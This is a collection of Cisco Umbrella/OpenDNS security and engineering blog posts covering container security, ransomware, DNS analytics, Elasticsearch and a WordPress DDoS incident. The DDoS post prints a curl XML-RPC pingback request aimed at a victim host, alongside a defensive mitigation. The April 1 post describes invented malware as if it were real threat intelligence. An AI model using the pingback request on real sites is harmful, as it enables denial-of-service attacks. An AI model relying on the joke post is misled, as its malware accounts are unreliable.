Hat Engineer Dan Walsh as saying, “Containers don’t contain.” What he means is, because an application or piece of code lives in a container, it doesn’t mean the container is going to prevent leaks to other containers or the OS itself. In other words, there is nothing inherently secure about containers. In fact, Mortman said, Docker has openly admitted this fact in the past. “If you talk to the Docker guys, they say ‘Of course there are security issues. This is beta code,” Mortman said. And that’s the underlying issue. Sure the security problems extend from necessity of root privilege in containers to run a process or app, and namespace issues with the Linux host. Docker’s own documentation highlights four core security issues that should be addressed when using the platform. “From an application perspective,” Mortman said, “you have only what you need, which is great.” But, he added, the security concerns are that of really any operating system. Backing up data, reducing the attack surface, keeping access levels under control, are all still necessary. During his talk, Mortman recommended using the Docker Security Benchmark tool available on Github. It’s a utility developers can run against a container that will check for dozens of known security issues. It’s based on the collaboration project Docker embarked on with the Center for Internet Security, which resulted in a 120-plus page benchmark for security best practices. And outside of the 17 or so security bullet points that Mortman outlined in his talk, above all, he said container security should be treated just like Linux or OS security. One core piece of advice about Docker is exercising extreme care about using public containers. Docker Hub is like any open software platform, with publicly available images, scripts, apps, and utilities developers can find on Github and repurpose — more than 100,000 of them. And the Docker Hub registry does its best to ensure the validity of images by adding signatures and hashes of the image to make sure what is in the image’s manifest is actually what’s in the image. But, Mortman cautioned, “Don’t trust them blindly. It’s not rocket science, but we all do it sometimes.” Developers should still check the hashes of any image pulled from a public source before using it in production. Embrace the benefits, but with caution If embracing the power of Docker, it’s a good idea to temper it with good container hygiene, like not using root unless absolutely necessary (which it usually is not), preventing container leaks, mounting only necessary volumes and not extraneous ones like etc. OpenDNS Security Engineer Chris Dorros says using a container hosting platform can help ensure the hygiene required for large enterprises.  “Having a platform for developers where they can host their containers as a service can help centralize security controls and greatly reduce mistakes,” he said in an e-mail interview. “At OpenDNS we use a homegrown system called Quadra, but there are others like Kubernetes.” For more on Quadra and how OpenDNS uses Docker, see the previous posts from the OpenDNS engineering team.", "date": "2016-03-17"},
{"website": "Cisco-Umbrella", "title": "Ransomware and the \"Dark Web\"", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/ransomware-dark-web", "abstract": "The Back Story From infected hospitals to utilizing new platforms , we have seen a recent uptick in media coverage of ransomware attacks. By now we assume most of you are familiar with ransomware but we have published a primer in the past. At OpenDNS and Cisco we have published numerous blogs, papers, and webcasts on the subject. We’ve also presented on ransomware since early 2012 — most recently on the emergence of Ransomware as a Service. If you want a refresh on some of our content, here are links to our most read materials: Easy, Cheap and Costly: Ransomware is Growing Exponentially Tracking the Footprints of Ransomware Cryptolocker Bedep Lurking in Angler’s Shadows Sophistication Increases With ransomware attacks, we have seen a plethora of techniques that range from infecting users through email lures to piggybacking on exploits and other infections such as Angler. Equally as sophisticated, attackers have built resilient infrastructures for their platforms. We have seen several techniques over the years, including the use of Domain Generated Algorithms (DGA), infecting good web properties, and using TLDs, CCTLDs, and GTLDs. With the most recent Apple OS X version of ransomware, attackers infected the Transmission clients software with their own code to avoid detection and get installs. Although this attack was not prevalent for a variety of reasons, it does highlight the rise in sophistication. The Dark Web As mentioned above, in this particular version the attackers infected a client that utilized the Tor network for routing their users. While the Tor network is a powerful tool that allows users to avoid eavesdropping and possible surveillance for lawful citizens, unfortunately, it is also sometimes abused by criminal enterprises — such as the ransomware folks — to avoid detection. In this case the IP address we outlined in our video is the IP of a Tor proxy. It’s important to note that this is *not* the location of the hosting service but a location that acts as a gateway to the information. The IP addresses that the domains resolve to are simply proxies that take you to the ultimate destination. After some investigation of the indicators from a recent Palo Alto Networks article on a piece of malware coined “KeRanger,” we noticed the attackers are using the TOR network. What we found particularly interesting is what lurked on the same infrastructure that the attackers were using to host their data. Among other items on the same network — as Palo Alto’s blog outlined — we discovered: Ransomware as a Service (RaaS) sites, instructions for end-users on how to pay for decryption, credit card and other credentials for sale, online black hat carding forums, hacker training contents, and illegal drugs for sale. We have included some screenshots of these sites below along with some screenshots of the Tor proxy pages: Protecting your Enterprise: Effectively Simple Throughout the years OpenDNS has done an amazing job at protecting customers from the various versions of ransomware by detecting the infrastructure that the attacks utilize to connect, control, and transfer the keys to evoke the encryption. Arguably the simplest and most effective way to prevent your files from being encrypted is to configure your recursive DNS to our infrastructure. Additionally, our Investigate product allows you to not only pivot through the infrastructure to validate the context of an Indicator of Compromise (IOC). Below is a quick screen share video of our Investigative product looking at the most recent version of KeRanger. Protecting against Encryption The most sophisticated criminals are continually testing new infection methods and evasion techniques. One example of this is the use of encryption on the network. In this particular case the addition of an endpoint is critical in defense. In the above example, if the encryption was invoked then Cisco’s AMP for Endpoint product works as a great additional layer of both visibility, retrospection, and enforcement for ransomware. For the particular case of OS X, AMP had endpoint protection for customers, as evident by this screenshot: Moving Forward With the advent of Ransomware as a Service it is likely we will see more groups involved in this technique of extorting money from companies, and a rise in the sophistication of their infection vectors,  infrastructure, and business models. Items such as trickling or selective encryption, data awareness, and target awareness are all likely to surface. With that, no company should be without a strategy to prevent, detect, and respond to these attacks as they are the combination of sophisticated and well-resourced adversaries, and are impactful to running your business.", "date": "2016-03-09"},
{"website": "Cisco-Umbrella", "title": "Winter has come for Game of Thrones, and so has more granular inspection of URLs and files in Cisco Umbrella!", "author": ["Kate MacLean"], "link": "https://umbrella.cisco.com/blog/file-inspection", "abstract": "You just finished binge-watching season seven of Game of Thrones. Ah, here comes the post-GoT sadness. To ease your woes, you begin your search for a new series to start binging. You can usually tell if a series will be good or bad just from the title, poster, actors, and genre, but for some, you need a closer look at other info like a description, preview, and rating. This is similar to Cisco Umbrella’s inspection! For most sites, Umbrella uses DNS-based intelligence and inspection to determine if good or bad. Then for a subset — the unknown or risky HTTP/HTTPS websites — Umbrella uses deeper inspection to determine if allowed or blocked. And, we’ve recently added two new features — file inspection and custom URL blocking — to provide you with even stronger protection! Unfortunately, these features can’t prevent you from watching a bad series  –– don’t worry, GoT season 8 will be here before you know it. Grab your popcorn, here’s a breakdown of the features: File inspection File inspection is a feature that scans files attempted to be accessed from the web to see if they contain malicious code, and blocks them if they do. If we receive a request for a file that matches our 150+ supported file types – .PDF, .EXE and more – we check the hash against info provided by a partner anti-virus (AV) engine and Cisco Advanced Malware Protection (AMP) to determine to block or allow. Learn more here . Custom URL blocking You probably have access to threat intel on malicious URLs from other products, industry groups, and more. With Umbrella’s custom URL blocking, taking action on this info is easier and automated. You can add a single URL or upload a list of URLs to a block list, and automatically prevent your users from accessing these sites whether on or off the network. Learn more here . Umbrella’s intelligent proxy Most phishing, malware, ransomware, and other threats are hosted on domains that are classified as malicious. Yet some domains host both malicious and safe content — we consider these risky domains. If Umbrella receives a request for a risky domain, it is routed to our intelligent proxy for deeper inspection. Additionally, if Umbrella receives a request for a URL that is on a customer’s block list, it is also routed to our proxy and blocked. Learn more here . Support for HTTPS traffic We can scan both HTTP (e.g. clear text) websites and HTTPS (e.g. encrypted) websites. This is important because HTTPS websites represent almost half the internet! The Cisco Root CA is required to make decryption possible. Learn more here . We have more exciting enhancements planned for our intelligent proxy — stay tuned to understand how Umbrella continues to deliver better protection for you. And best of luck finding your next series to watch!", "date": "2017-09-25"},
{"website": "Cisco-Umbrella", "title": "BGP Stream: The Emergency Alert System for the Internet", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/bgp-stream-the-emergency-alert-system-for-the-internet", "abstract": "Editor’s note: For a brush up on BGP, how it works, and its Internet security implications, see our two-part series . Because of its antiquated design , BGP (border gateway protocol) changes can be the cause of daily Internet outages. As a backbone protocol of the Internet, whether by mistake or by malicious intent, BGP is capable of halting even the largest Internet sites and services. And while a typical BGP change alert includes useful Autonomous System (AS) information, thousands occur every day and lack any detail about the motive behind the initial change. And according to OpenDNS Network Engineering Manager Andree Toonk, the change process in BGP leaves lots of questions unanswered. During BGP events, Toonk says, customers have many initial questions including: ‘Did this only affect me?’ and ‘Was it targeted?’ But it can be difficult to find answers to these questions as confirming sources are in short supply. Toonk said he wanted to provide a new, real-time source for answers when BGP goes wrong. Update tweet from OpenDNS CTO Dan Hubbard Along with a team of OpenDNS engineers and CTO Dan Hubbard, he conceptualized a live stream during a recent hackathon project. Hubbard and Toonk are scheduled to present their work at Blackhat USA 2015 on August 6 . Named BGP Stream , the system’s primary function initially will be to post live updates about outages, potential hijacks, and leaks to a Twitter account (@bgpstream). According to Toonk, an important component to the project was creating a stream of live updates that can help cut out all the noise, since daily changes to BGP measure in the thousands. To help networking professionals and ISPs decide what outages or alerts are important, BGP Stream will use correlating indicators to qualify which events are larger and more important. “The big challenge is to figure out if [a change] is normal or not,” Toonk said. “Sometimes a new ASN will pop up and look like a hijack, but it could be normal behavior for an organization that has multiple ASNs.” Analyzing correlating info like whether the ASNs involved are from the same country, or if there is a historical relation between the two, weighed against many other factors, can give good indication to a routing update’s legitimacy. Follow @bgpstream on Twitter for updates, and if you are attending Blackhat USA 2015, be sure to attend Hubbard and Toonk’s session on BGP Stream.", "date": "2015-07-30"},
{"website": "Cisco-Umbrella", "title": "Introducing SecureRank, a large-scale discovery algorithm for predictive detection", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/secure-rank-a-large-scale-discovery-algorithm-for-predictive-detection", "abstract": "At OpenDNS, terabytes of data flow in and out everyday. It takes creativity and solid data science skills to innovate ways to transform an enormous amount of data into security discoveries. In a series of blogs, we will share algorithmic details of our home-grown discovery algorithms that leverage big data, machine learning and graph theory to make predictive detections. We start off with SecureRank, which has been presented at a couple security community meet-ups recently. If you haven’t seen it, or prefer video to text, you can watch the SecureRank presentation at this YouTube link . Conceptually, a good abstraction of DNS traffic is a bipartite graph. It’s huge, even if you are looking at a small fraction of the Internet. The left set of vertex consists of the client machines (requestors) making DNS requests; the right set of vertex are the hostnames (requestees) that are requested. So how does a DNS bipartite graph give us an edge in making security discoveries? Consider, for example, the websites Google.com and example.evil.com (a made-up botnet C&C hostname). Imagine that Google.com is much more popular than example.evil.com, as the Google.com vertex appears more densely connected on the graph. The popularity rank can be inferred using page rank-like algorithms. However, popularity alone is a not a good indicator of maliciousness. What about layering the graph with existing knowledge? There are known bad actors on the Internet, as well as websites we know to be clean. Imagine that we color our graph with different shades of “red” to indicate the bad ones, while “green” for the good ones. We’re likely to see clusters of ‘red’ zones and they are quite separate from “green” zones with few intra links. We generalize the above rationale and observations as one hypothesis “hostnames requested by known infected clients but never requested by clean clients are most likely to be bad.” Based on this hypothesis, SecureRank ranks the security risks of all hostnames by applying an iterative process similar to the page rank algorithm in the following steps. The algorithm Iterative definition Link analysis: This involves marching through global DNS query data and mapping the requestor-requestee pairs as a graph. Initialization: This gives negative ranks to known blocked domains and assigns positive ranks to known allowed domains. SecureRank iterations : This concept is illustrated in the simple example below. Convergence and output final ranks: Final ranks are generated when the ranks converge after a number of iterations. Implementation: The algorithm is implemented in Java following Hadoop MapReduce framework. Details can be found in the YouTube video mentioned earlier. Empirical results evaluation Two metrics were used to evaluate the results: false positive rate and false negative rate. The data sets we used (as the closest thing to gold standard positive set and negative set) are composed of a list of 670,199 known malicious sites and the Quantcast top million sites. Our hypothesis has stated that domains that receive low SecureRank, in particular, in the negative value range, are more likely to be malicious. At the same time, malicious sites should more likely receive a negative rank, but not necessarily (consider compromised legitimate sites). The resulting SecureRanks of 83% of the blocked sites are negative. 530 out of the Quantcast top million sites (potential false positive rate = 0.053%) received negative ranks in a particular time window. Further scrutiny of these potential false positives showed that: 1) these sites are on the left end axis of negative values, all in the range of [-0.099,0). 2) Forty five sites were also flagged by Google safe browsing. 3) The majority of these sites are parked domains or spam/scam suspects. None of the sites can be deemed as significant false positives. SecureRank in action! SecureRank is integrated into the Umbrella Security Graph. When a query has an alarmingly low SecureRank, an alert bar is shown. Using SecureRank in our back-end classification engine, we’re alerted to 200,000+ likely malicious domains each day. The majority of these sites include spam, scams, botnets or malware. The large-scale discovery technique is used in combination with our other intelligence and predictive algorithms to preventively protect OpenDNS customer from known and unknown security risks.", "date": "2013-03-28"},
{"website": "Cisco-Umbrella", "title": "Elasticsearch: You Know, For Logs [Part 4]", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/elasticsearch-you-know-for-logs-part-4", "abstract": "Part 4: Advanced Options Part 3 of this series explores searching and sorting log data in Elasticsearch and how to best configure Elasticsearch for these operations. This post will focus on some other options in Elasticsearch for speeding up indexing and searching as well as saving on storage that didn’t have a place in any of the three previous posts. Some of these options come with trade offs and are not recommended in all cases. Bulk Indexing Indexing documents one at a time is inefficient, especially with small documents like log files. To speed up indexing, use the Elasticsearch Bulk API . The Bulk API allows documents to be indexed in batches instead of individually, greatly increasing indexing speed. Bulk indexing using the REST API is fairly straight forward. Following this schema given by Elastic: action_and_meta_datan\noptional_sourcen\naction_and_meta_datan\noptional_sourcen\n.... A Bulk request will look like: curl -XPOST 'http://localhost:9200/_bulk' -d '{\n{ \"index\" : { \"_index\" : \"logs\", \"_type\" : \"log\" } }\n{ \"Timestamp\" : \"2009-11-15T14:12:12\", \"URL\" : \"opendns.com\", \"IP Address\" : \"127.0.0.1\", \"log_id\" : 1}\n{ \"index\" : { \"_index\" : \"logs\", \"_type\" : \"log\" } }\n{ \"Timestamp\" : \"2009-11-15T14:12:13\", \"URL\" : \"opendns.com/enterprise-security\", \"IP Address\" : \"127.0.0.1\", \"log_id\" : 2}\n{ \"index\" : { \"_index\" : \"logs\", \"_type\" : \"log\" } }\n{ \"Timestamp\" : \"2009-11-15T14:12:13\", \"URL\" : \"opendns.com/about\", \"IP Address\" : \"127.0.0.1\", \"log_id\" : 3}\n}' A couple important configurations need to be set when using the Bulk API. Firstly, bulk requests should be done in batches of a specific size in order to optimize throughput. A batch size of Two-thousand five hundred is a good first guess; Elasticsearch suggests anywhere from 1000 to 5000 . Secondly, the Bulk API can drop documents if the Bulk Queue Size is set too low. If this happens the following remote transport exception will be thrown: RemoteTransportException[[<>][inet[/127.0.0.1:9300]][bulk/shard]]; nested: EsRejectedExecutionException[rejected execution (queue capacity 50) on org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1@1234]; The threadpool.bulk.queue_size must be increased until this error is no longer thrown. The default value is 50; Increasing it to 1000 in Elasticsearch’s configuration(elasticsearch.yml) should solve the problem for most clusters: threadpool.bulk.queue_size: 1000 Routing Elasticsearch allows the ability to ensure related documents are all stored on the same shard using the routing feature. If a routing key is given to a document, Elasticsearch will read the key and route the document to the shard that contains other documents with the same key. Example: curl -XPOST 'http://localhost:9200/logs/log?routing=com' -d '{\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\n    \"URL\" : \"opendns.com/about\",\n    \"TLD\" : \"com\",\n    \"IP Address\" : \"127.0.0.1\"\n}' Indexing a document with the command above will ensure it resides in the same shard as all other documents with the “com” routing key. The routing path can be derived from the document itself in the mapping, similar to how the ID path is specified, for example: $ curl -XPUT 'http://localhost:9200/logs/_mapping/log' -d '\n{\n  \"log\" : {\n          \"_routing\" : {\"path\" : \"TLD\"},\n         \"_id\" : {\"path\" : \"log_id\"},\n        \"properties\" : {\n           \"Timestamp\" : {\"type\" : \"date\"},\n                \"URL\" : {\"type\" : \"string\",\n                                \"index\": \"not_analyzed\"},\n                \"TLD\" : {\"type\" : \"string\",\n                                \"index\": \"not_analyzed\"},\n           \"IP Address\" : {\"type\": \"ip\"},\n         \"log_id\" : {\"type\" : \"string\",\n                     \"index\" : \"not_analyzed\"}\n        }\n    }\n}' This mapping will route log documents by their “TLD” field. Routing Advantages The advantages of routing documents comes when it is time to execute search requests. When searching for documents with the same routing key, Elasticsearch knows exactly which shard the documents reside in and thus only has to send the search request to said shard. Without Routing: With Routing: Since Elasticsearch only has to query a single shard, query response time will decrease significantly. Another added benefit is the nodes that don’t contain the target shard will not have to process any search request at all, thus saving valuable CPU cycles. The benefits of routing documents increase with the number of shards in a cluster. Small clusters with under 50 shards will likely only see a small speed increase. Though as a cluster grows and approaches 200+ shards, the benefits of routing become more apparent: To perform routed queries, simply include the routing key in the search request: curl -XGET localhost:9200/_search?routing=com -d '\n{\n  \"query\": {\n    \"filtered\": {\n      \"filter\": {\n        \"term\": { \"URL\": { \"opendns.com\" }}\n      }\n    }\n  }\n}\n' Routing Disadvantages One of the benefits of letting Elasticsearch control the routing, is documents will be uniformly spread across all shards in an index. Once user-determined routing is introduced, this uniformity is lost since every document with the same routing key must exist in the same shard. This can cause certain shards to be far larger than others, and as a result can cause nodes to be “hot spotted” by common routing values, stressing the CPU and eating through storage. For example, say we decided to route DNS logs by TLDs. This might work great for smaller TLDs such as “.gov” and “.edu.” But what happens if all “.com” and “.org” logs get routed to the same shard? The node containing said shard will receive far more traffic than the other nodes, just because it got unlucky and happened to catch two large routing values. After introducing routing to our tests, we saw the following variations in CPU usage over our data nodes: This graph shows the high volatility in CPU usage that routing can cause when there is variability in the traffic flowing to different routing keys. Furthermore, it is possible in some cases for routing to cause issues with storage. Say for example we have 2TB of “.com” DNS logs in an index but our instances only have 1TB of disk. All 2TB of data will attempt to be routed to a single instance, which will promptly run out of storage. For further information on routing, Sematext gives a very informative presentation on scaling massive Elasticsearch clusters that talk in detail about routing and its advantages. Optimize Within each Elasticsearch shard, there are several segments that get periodically merged as the segment count grows. Having multiple segments in a shard means search requests must search each segment individually, then aggregate and return the results. Having to aggregate the results means that having multiple segments per shard will slow down queries. By optimizing an index, Elasticsearch is merging every possible segment into a single segment to maximize query performance. Running the following command will optimize an index down to a single segment: $ curl -XPOST 'http://localhost:9200/twitter/_optimize?max_num_segments=1' Note that this is an operation that should only be performed on old indices. For example, when indexing logs by time period, it would be smart to optimize indices whose time frame has ended since they won’t be creating new indices. It might be pointless however to optimize the index responsible for the current time period since it is active and will be creating additional segments anyways. Also, optimizing an index is a heavy duty operation that should only be performed when the cluster can handle it. For more information on Elasticsearch segments and the optimize API visit this page . ‘_all’ Field By default Elasticsearch stores an ‘_all’ field for each document, which includes the contents of every field in the document. The _all field is meant to be searchable in the case where a user doesn’t want to specify the field names when searching. In most cases this functionality is not needed for log data, so it should be disabled to free up extra storage: By adding the highlighted line to a PUT mapping request, the _all field will be disabled for documents of type “log” in index “logs”: $ curl -XPUT 'http://localhost:9200/logs/_mapping/log' -d '\n{\n    \"log\" : {\n          \"_all\" : {\"enabled\": false},\n        \"properties\" : {\n          \"Timestamp\" : {\"type\" : \"date\"},\n               \"URL\" : {\"type\" : \"string\",\n                              \"index\": \"not_analyzed\"},\n        \"IP Address\" : {\"type\": \"ip\"}\n          }\n     }\n}\n' Disabling ‘_source’ By default Elasticsearch stores the source JSON for each document in the ‘_source’ field. When executing searches, Elasticsearch will simply return the _source field. The downside to storing the source is it adds a lot of extra storage overhead for each document. If storage is a concern, it is possible to disable the _source field and instead store each field value individually. This is done through the mapping API: $ curl -XPUT 'http://localhost:9200/logs/_mapping/log' -d '\n{\n  \"log\" : {\n          \"_source\" : {\"enabled\" : false},\n         \"_id\" : {\"path\" : \"log_id\"},\n       \"properties\" : {\n         \"Timestamp\" : {\"type\" : \"date\",\n                                 \"store\" : \"yes\"},\n              \"URL\" : {\"type\" : \"string\",\n                              \"index\" : \"not_analyzed\",\n                             \"store\" : \"yes\"},\n          \"IP Address\" : {\"type\" : \"ip\",\n                                 \"store\" : \"yes\"},\n        \"log_id\" : {\"type\" : \"string\",\n                     \"index\" : \"not_analyzed\"}\n        }\n    }\n}' Notice that for each field you might want to be able to retrieve must have the {“store” : “yes”} clause. Using this mapping will significantly reduce storage requirements, but it makes queries slightly more complex. Since Elasticsearch is no longer storing the source JSON, it will have to retrieve and aggregate the desired fields before returning. This can cause high Disk I/O and slower queries. The following query will return the stored fields without needing a ‘_source’ JSON: curl -XGET localhost:9200/_search -d '\n{\n“fields” : [“Timestamp”, “URL”, “IP Address”],\n  \"query\": {\n    \"filtered\": {\n      \"filter\": {\n        \"term\": { \"URL\": { \"opendns.com\" }}\n      }\n    }\n  }\n}\n' Conclusion This post was meant to demonstrate that Elasticsearch has several advanced features and configurations that can be used to customize a cluster for many different applications. Whether a cluster is being constrained by storage space, search speeds or indexing rates, Elasticsearch can accomodate. That said, there is still a plethora of cool features in Elasticsearch that were left out of this series. To learn more about Elasticsearch, Elastic provides a highly detailed guide .", "date": "2015-05-19"},
{"website": "Cisco-Umbrella", "title": "Docker at OpenDNS", "author": ["Kris Foster"], "link": "https://umbrella.cisco.com/blog/docker-at-opendns", "abstract": "We’ve been hard at work this year building out Quadra, our internal Platform as a Service (PaaS), for our engineering teams. Quadra relies heavily on Docker for application deployment. Last night at OpenLate, OpenDNS Infrastructure Engineer Jessica Gadling presented a talk and demo of our progress so far. Below is a quick summary of Jessica’s talk. Docker at OpenDNS from OpenDNS Motivations At OpenDNS we have many engineering teams working on a range of products and internal services. We take pride in the fact that engineers can choose tools and technologies that best meet their needs. We also have a number of environments (dev, staging, production) across our own dedicated infrastructure and Amazon’s AWS. This can make dependency management difficult when sharing compute resources. Why Docker? We chose to Docker (http://docker.io) as a central component in our PaaS. Containerization makes software packaging and deployment simple by bundling applications with their dependencies and isolating both from unrelated applications. Virtualization was another option, but efficiently utilizing shared resources and the management overhead can become costly. We’re able to deploy hundreds of instances to individual hosts easily with low overhead. Quadra We’ve provided our engineers with a CLI tool to work with Quadra. This is a simple and human-friendly interface that gives our engineers enough power and control to build and deploy applications directly or from a CI tool such as Jenkins. Base images are provided for common dependencies. We’ve also created pre-baked load balancers that can talk to the PaaS and keep proxy configurations up to date, so new projects can be up and running quickly. Behind the scenes Quadra takes care of scheduling application instances to appropriate hosts based upon host utilization. Routing traffic to Quadra instances is fully automated by our software based routing layer . Future Improvements and features added to Docker are quickly incorporated into our PaaS. It’s an exciting time to be working with this technology. We look forward to talking in more detail about Docker and the rest of Quadra! About OpenLate OpenLate is biweekly meetup at OpenDNS offices featuring technical talks and hack time. The community in San Francisco is over 600 engineers, and talks have included maintainers of prominent open source projects, authors, and industry leaders. Learn more at meetup.com/openlate .", "date": "2014-10-22"},
{"website": "Cisco-Umbrella", "title": "New Malware Attacks On The Threat Horizon", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/new-malware-attacks-on-the-threat-horizon", "abstract": "At OpenDNS Security Labs we thrive on continual innovation. We look at our extensive data collection network built on top of a very large security infrastructure and use this data to predict what’s coming next.  We’re a team of world-class engineers, mathematicians, and security researchers, and we’re taking an innovative and proactive approach to security research. It’s often stated that being a DNS company puts us in a bleeding edge position from a security standpoint as we are able to harness tons of data regarding internet activity and discover and predict new and interesting threats by analyzing patterns in the data that we receive. When you’re the tip of the spear, you end up running into a lot of new and unique threats that are unrecognized throughout the security community. Listed are a few of the top recognized unique threats in Q1 of 2015: Win32.Siesta A simple botnet attack that spreads by infecting all EXE files found in drives C to Z, which then causes your computer to slow down considerably (almost as if it’s in ‘sleep’ mode) consistently between the hours of 2pm and 4pm CST. This botnet infection was discovered by OpenDNS Labs early this year, however further investigation would reveal that this attack has been around for much longer. The location of this attack reportedly originated in Mexico, the Mediterranean and also certain parts of Southern Europe. Facebook.Access.Recursion Trojan (Win.32/F.arT) A malicious script (popularly referred to as the Trojan Malodorous) designed to hijack Facebook activity, this Trojan is usually seen in web pages that perform “click-jacking,” forcing users to “like,” share” or “comment” on pages in Facebook without their knowledge. It has been reported that many who are infected with this malware tend to, for whatever reason, deny it’s existence and proclaim that it must have come from someone else’s computer. While OpenDNS protects against this threat, it’s also been mythicized that lighting a match and blowing it out near the infected computer will mostly mask the effects of the Trojan. Paleo Botnet A direct derivative of the Palveo botnet, this attack works in a very similar fashion. It is a standard botnet that, once executed, creates registry entries to ensure that it runs every time Windows starts. The worm then crossfit’s a back door on the compromised computer and attempts to connect to an IRC server to receive commands, such as oddly deleting any files containing the words “Dairy,” “Grains” or “Alcohol.” This attack was initially created with the intention of improving the computer’s overall status, appearance, and to give the Network Admin something to talk about at social events, however it has since been declared an annoying nuisance by many computer scientists. CryptoWhopper New variants of Ransomware Trojans are still actively being created and released, as many other security solutions do not have an answer for this particular variety of malware. When activated, CryptoWhopper encrypts certain types of files stored on local and mounted network drives using RSA public-key cryptography, with the private key stored only on the malware’s control servers. The malware then displays a message which offers to decrypt the data if a burger is eaten by the stated deadline, and also threatens to delete the private key if the deadline passes. Stay tuned for our detailed report on each of the aforementioned advanced paradigm-shifting cyber threats.", "date": "2015-04-01"},
{"website": "Cisco-Umbrella", "title": "WordPress DDoS Visibility from OpenDNS", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/wordpress-ddos-visibility-opendns", "abstract": "Our friends over at Sucuri posted an interesting blog regarding a Distributed Denial of Service attack (DDoS) where 162,000 WordPress sites were enlisted to attack a single website. Daniel Cid , the CTO of Sucuri, explains the story: It all happened against a popular WordPress site that had gone down for many hours due to a DDOS. As the attack increased in size, their host shut them down, and then they decided to ask for help and subscribed to our CloudProxy Website Firewall. Once the DNS was ported we were able to see what was going on, it was a large HTTP-based (layer 7) distributed flood attack, sending hundreds of requests per second to their server. Daniel and I go way back, having worked at Q1 Labs (now IBM) in addition to co-authoring the OSSEC Host-Based Intrusion Detection Guide with Rory Bray and myself. I reached out to Daniel to see if we could share information and see if OpenDNS observed the attack in some shape or form. On Saturday, March 9, 2014 (when the attack commenced), OpenDNS tracked 255 unique (4838 total) IP addresses querying for the targeted site – which we shall refer to as “the target”. This caused a noticeable spike in DNS queries that registered well above the normal traffic pattern for the target: The top 10 most active IP addresses querying the target on March 9 are shown below in an effort to communicate the magnitude: This includes 3389 IPv4 address (A) records, 1398 IPv6 address (AAAA) records, 5 delegation signer (DS) records, 35 mail exchange (MX) records, and only 1 name server (NS) record. Note: A full description of the various DNS record types can be found here Daniel also notes that all the requests were coming from valid and legitimate WordPress sites by exploiting the XML remote procedure call ( XMLRPC ) used for pingbacks, trackbacks, remote access via mobile devices and many other features you’re likely very fond of. One attacker can use thousands of popular and clean WordPress sites to perform their DDOS attack, while being hidden in the shadows, and that all happens with a simple ping back request to the XML-RPC file: $ curl -D - \"www.anywordpresssite.com/xmlrpc.php\" -d 'pingback.pinghttp://victim.comwww.anywordpresssite.com/postchosen' By default, this feature is enabled in all WordPress installs. A quick search on Shodan for xmlrpc.php gives us quite a few installations that could potentially be enlisted for future attacks. On March 12, 2014 Brian Krebs tweeted a link that contained a list of websites used for the attack in question. After correlating Krebs’ list with our DNS intelligence, we identified 135 IP addresses that were active during the March 9, 2014 12:00 GMT and 16:00 GMT time window and using OpenDNS for name resolution. Only 104 IP addresses were active at the time of our subsequent research (March 12, 2014 at 8:00 GMT). Of those 104 IP addresses 33 run WordPress with 14 of those having known vulnerabilities that could potentially lead to future compromises if left unresolved. ( Note: The quick scanning of the WordPress sites to detect vulnerabilities was performed using WordPress Security Scanner ). Sucuri and OpenDNS recommends adding the following API filter to your WordPress sites to help mitigate this issue: add_filter( ‘xmlrpc_methods’, function( $methods ) { unset( $methods['pingback.ping'] ); return $methods; } ); More information on working with the WordPress API filter can be found here . Removing xmlrpc.php is not recommended , as it will break a number of other features that will use the API.", "date": "2014-03-13"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella celebrates National Cybersecurity Awareness Month (NCSAM)", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/celebrate-national-cybersecurity-awareness-month-ncsam", "abstract": "It might be hard to believe, but it’s already October, which means the leaves are changing, the weather is getting colder, and – you guessed it – people everywhere are taking steps to improve their cybersecurity knowledge and practices to combat cyberattacks. Now in its 17th year, National Cybersecurity Awareness Month (NCSAM) started as a project of the Cybersecurity & Infrastructure Security Agency (CISA), a division of the United States Department of Homeland Security (DHS). Today, NCSAM has expanded across the globe as more sophisticated threats emerge and more connected devices are in use. NCSAM is intended to raise awareness about the importance of cybersecurity awareness and preparation both at home and in businesses. NCSAM is a campaign for individuals and organizations to take accountability for being more secure on the internet and making a proactive plan to improve their cybersecurity knowledge and practices. With more people working from home and students using online learning resources, it’s more important than ever to learn how to be safer and more secure when connecting to the internet, and to make a commitment to take steps to be more secure. At Cisco, we live and breathe cybersecurity every day of the year, but we are especially excited to elevate the important messages of NCSAM this year. We know that remote work is here to stay , and many schools have employed remote learning for students for the near or longer term. We also know that our critical healthcare organizations are at risk for cyberattacks due to the rising number of internet-connected medical devices and clinical systems. Everyone has a role to play in ensuring a safe and secure internet experience, from users to administrators, and knowledge is power. To celebrate NCSAM 2020, we’ve compiled a list of resources to help you learn more about key cybersecurity topics and get advice on how to improve the security of your organization. Start with the basics If you’re new to cybersecurity or could use a refresher on some key topics, check out some of our recent blog posts that break down technical concepts for a general audience. Cybersecurity terms and threats you need to know in 2020 What is cloud security? What is DNS-layer security? What is the difference between recursive and authoritative DNS? What is a proxy server? What is CASB? Read a new cybersecurity ebook Want to dive deeper into a topic? Our ebooks are easy to read in a single sitting and give you the key information you need to handle your organization’s specific cybersecurity challenges. Secure Access Service Edge (SASE) for Dummies Ransomware Defense for Dummies What attacks aren’t you seeing? Network security made simple Cybersecurity for remote workers Get serious about cybersecurity education With more than 3.5 million cybersecurity jobs expected to go unfilled in 2021 according to Cybersecurity Ventures, there’s never been a better time to consider learning more about the topic. #CyberSelfCare: Reinvest Your Commute Time with Cybersecurity Training and Education Learn about the latest trends in cyberthreats The Cisco Umbrella threat research team is constantly working to uncover new, emerging cyberthreats. Cisco Umbrella discovers evolving cyberthreats in 2020 Navigating Cybersecurity During a Pandemic: Latest Malware and Threat Actors Inadequate security makes WordPress sites a land of opportunity for hackers Know your enemy: Protecting against the top threats of 2020 Whatever your plans are for October, don’t forget to keep cybersecurity awareness on your radar. After all, who says you can’t sip a pumpkin spice latte while you read?", "date": "2020-10-06"},
